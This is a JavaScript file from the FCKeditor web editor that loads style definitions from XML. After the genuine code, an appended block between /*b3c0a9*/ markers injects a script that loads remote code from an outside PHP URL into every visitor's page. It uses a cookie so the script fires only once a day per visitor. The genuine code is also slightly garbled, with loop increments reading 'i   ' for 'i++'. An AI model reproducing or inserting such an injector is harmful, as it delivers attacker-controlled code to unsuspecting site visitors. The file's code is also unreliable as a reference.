/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckstylesloader.js
 * 	FCKStylesLoader Class: this class define objects that are responsible
 * 	for loading the styles defined in the XML file.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKStylesLoader = function()
{
	this.Styles = new Object() ;
	this.StyleGroups = new Object() ;
	this.Loaded = false ;
	this.HasObjectElements = false ;
}

FCKStylesLoader.prototype.Load = function( stylesXmlUrl )
{
	// Load the XML file into a FCKXml object.
	var oXml = new FCKXml() ;
	oXml.LoadUrl( stylesXmlUrl ) ;
	
	// Get the "Style" nodes defined in the XML file.
	var aStyleNodes = oXml.SelectNodes( 'Styles/Style' ) ;
	
	// Add each style to our "Styles" collection.
	for ( var i = 0 ; i < aStyleNodes.length ; i   )
	{
		var sElement = aStyleNodes[i].attributes.getNamedItem('element').value.toUpperCase() ;
	
		// Create the style definition object.
		var oStyleDef = new FCKStyleDef( aStyleNodes[i].attributes.getNamedItem('name').value, sElement ) ;
		
		if ( oStyleDef.IsObjectElement )
			this.HasObjectElements = true ;
		
		// Get the attributes defined for the style (if any).
		var aAttNodes = oXml.SelectNodes( 'Attribute', aStyleNodes[i] ) ;
		
		// Add the attributes to the style definition object.
		for ( var j = 0 ; j < aAttNodes.length ; j   )
		{
			var sAttName	= aAttNodes[j].attributes.getNamedItem('name').value ;
			var sAttValue	= aAttNodes[j].attributes.getNamedItem('value').value ;

			// IE changes the "style" attribute value when applied to an element
			// so we must get the final resulting value (for comparision issues).
			if ( sAttName.toLowerCase() == 'style' )
			{
				var oTempE = document.createElement( 'SPAN' ) ;
				oTempE.style.cssText = sAttValue ;
				sAttValue = oTempE.style.cssText ;
			}
			
			oStyleDef.AddAttribute( sAttName, sAttValue ) ;
		}

		// Add the style to the "Styles" collection using it's name as the key.
		this.Styles[ oStyleDef.Name ] = oStyleDef ;
		
		// Add the style to the "StyleGroups" collection.
		var aGroup = this.StyleGroups[sElement] ;
		if ( aGroup == null )
		{
			this.StyleGroups[sElement] = new Array() ;
			aGroup = this.StyleGroups[sElement] ;
		}
		aGroup[aGroup.length] = oStyleDef ;
	}
	
	this.Loaded = true ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
